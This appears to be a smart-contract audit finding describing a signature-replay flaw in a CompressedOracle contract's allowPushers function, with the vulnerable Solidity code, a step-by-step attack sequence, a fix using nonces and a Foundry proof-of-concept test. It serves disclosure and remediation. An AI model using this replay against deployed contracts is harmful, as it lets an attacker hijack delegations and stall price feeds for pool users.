### Title
Creator Can Replay Pusher Consent Signature to Re-Establish Delegation After Revocation, Causing Stale Price Feeds in Pools — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`allowPushers` in `CompressedOracleV1` has no nonce or used-signature tracking. A creator who holds a pusher's previously submitted EIP-191 consent can replay it — within the deadline window — to silently re-establish delegation after the pusher has explicitly revoked it. This lets a malicious creator hijack a pusher's namespace attribution away from a second creator, causing that second creator's feeds to go stale and every pool anchored to those feeds to receive stale prices and halt swaps.

---

### Finding Description

`allowPushers` verifies a pusher's EIP-191 consent over `(chainid, oracle, deadline, pusher, creator)` and writes `namespaceRemapping[pusher] = msg.sender`. The function performs no nonce check and maintains no set of consumed signatures:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;   // unconditional overwrite
``` [1](#0-0) 

The code comment itself flags the residual risk: *"the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* The deadline is offered as the mitigation, but it only bounds the replay window — it does not prevent replay within that window. [2](#0-1) 

`revokePusher` clears the mapping:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

Because the original consent signature is not invalidated on revocation, creator A can immediately call `allowPushers` again with the same bytes to overwrite `namespaceRemapping[pusher]` back to `creator_A`, even after the pusher has re-delegated to creator B.

**Attack sequence:**

1. Pusher signs consent for creator A with `deadline = block.timestamp + 365 days`.
2. Creator A calls `allowPushers(deadline_A, [pusher], [sig_A])` → `namespaceRemapping[pusher] = creator_A`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Pusher signs a new consent for creator B; creator B calls `allowPushers(deadline_B, [pusher], [sig_B])` → `namespaceRemapping[pusher] = creator_B`.
5. Creator A replays the original call: `allowPushers(deadline_A, [pusher], [sig_A])` → `namespaceRemapping[pusher] = creator_A` (hijacked).
6. Every subsequent fallback push by the pusher lands in creator A's namespace; creator B's feeds receive no updates and go stale.

The `fallback` namespace resolution is:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

Once creator B's feeds are stale, `AnchoredPriceProvider._readLeg` detects staleness and returns `ok = false`:

```solidity
if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);
``` [5](#0-4) 

`getBidAndAskPrice` then reverts with `FeedStalled`, making every swap on pools anchored to creator B's feeds unusable. [6](#0-5) 

---

### Impact Explanation

Pools anchored to creator B's feeds receive stale prices. `AnchoredPriceProvider.getBidAndAskPrice` reverts with `FeedStalled`, making swaps, and therefore LP withdrawals that depend on swap-path pricing, unusable. This satisfies the "Broken core pool functionality causing unusable swap/liquidity flows" gate.

---

### Likelihood Explanation

Medium. Creator A already holds `sig_A` (they submitted it in step 2). The replay requires no additional privilege — `allowPushers` is a public, permissionless function. The only constraint is that `deadline_A` must not have expired. Pushers who sign long-lived consents (common in automated setups) are fully exposed for the entire deadline window.

---

### Recommendation

Track consumed signatures or introduce a per-pusher nonce into the consent digest. For example, store a `mapping(address => uint256) public pusherNonce` and include `pusherNonce[pusher]++` in the signed payload, incrementing it on each successful `allowPushers` call. Alternatively, maintain a `mapping(bytes32 => bool) internal usedConsents` keyed on the consent hash and reject any hash that has already been consumed.

---

### Proof of Concept

```solidity
// Pusher signs consent for creator A (long deadline)
uint256 deadline_A = block.timestamp + 365 days;
bytes memory sig_A = _signConsent(PUSHER_KEY, deadline_A, pusher, creator_A);

// Creator A delegates pusher
vm.prank(creator_A);
oracle.allowPushers(deadline_A, _arr(pusher), _arr(sig_A));
assertEq(oracle.namespaceRemapping(pusher), creator_A);

// Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0));

// Pusher re-delegates to creator B
uint256 deadline_B = block.timestamp + 30 days;
bytes memory sig_B = _signConsent(PUSHER_KEY, deadline_B, pusher, creator_B);
vm.prank(creator_B);
oracle.allowPushers(deadline_B, _arr(pusher), _arr(sig_B));
assertEq(oracle.namespaceRemapping(pusher), creator_B);

// Creator A replays original signature — hijack succeeds
vm.prank(creator_A);
oracle.allowPushers(deadline_A, _arr(pusher), _arr(sig_A));
assertEq(oracle.namespaceRemapping(pusher), creator_A); // ← creator_B overwritten

// Pusher's subsequent fallback pushes land in creator_A's namespace.
// Creator_B's feeds receive no updates → go stale → pools using creator_B's
// feeds revert with FeedStalled on every swap.
```

    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
